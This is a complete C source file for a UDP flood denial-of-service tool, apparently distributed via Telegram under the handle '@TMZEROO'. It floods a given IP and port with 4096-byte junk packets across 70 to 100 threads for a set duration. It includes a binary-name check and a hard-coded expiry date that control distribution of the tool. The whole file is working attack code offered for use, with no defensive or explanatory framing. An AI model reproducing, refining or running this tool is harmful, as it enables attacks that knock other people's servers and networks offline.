#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2024-10-30"
#define MAX_THREADS 100
#define MIN_THREADS 70

void *udp_flood(void *arg);
int check_binary_name(char *name);
int check_expiry();

struct attack_info {
    char *target_ip;
    int target_port;
    int attack_duration;
};

int main(int argc, char *argv[]) {
    if (!check_binary_name(argv[0])) {
        fprintf(stderr, "Bsdk Name Rename Mat Kar or nand Name Rakh\n");
        return 1;
    }

    if (check_expiry()) {
        fprintf(stderr, "Binary is Closed By @TMZEROO From TG\n");
        return 1;
    }

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <ip> <port> <time> <threads>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int attack_duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads < MIN_THREADS) {
        fprintf(stderr, "Minimum number of threads should be %d\n", MIN_THREADS);
        return 1;
    }

    printf("Attack started by @TMZEROO From TG\n");

    struct attack_info info;
    info.target_ip = target_ip;
    info.target_port = target_port;
    info.attack_duration = attack_duration;

    pthread_t thread_pool[MAX_THREADS];
    for (int i = 0; i < threads && i < MAX_THREADS; i++) {
        pthread_create(&thread_pool[i], NULL, udp_flood, (void *)&info);
    }

    sleep(attack_duration);

    for (int i = 0; i < threads && i < MAX_THREADS; i++) {
        pthread_join(thread_pool[i], NULL);
    }

    printf("Attack Finished By @TMZEROO On TG\n");

    return 0;
}

void *udp_flood(void *arg) {
    struct attack_info *info = (struct attack_info *)arg;
    int sockfd;
    struct sockaddr_in target_addr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("socket");
        pthread_exit(NULL);
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(info->target_port);
    target_addr.sin_addr.s_addr = inet_addr(info->target_ip);

    char packet[4096];
    memset(packet, 'A', sizeof(packet));

    time_t end_time = time(NULL) + info->attack_duration;

    while (time(NULL) < end_time) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
    }

    close(sockfd);
    pthread_exit(NULL);
}

int check_binary_name(char *name) {
    if (strstr(name, "nand") == NULL) {
        return 0;
    }
    return 1;
}

int check_expiry() {
    struct tm expiry;
    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry);
    time_t now = time(NULL);
    return now > mktime(&expiry);
}
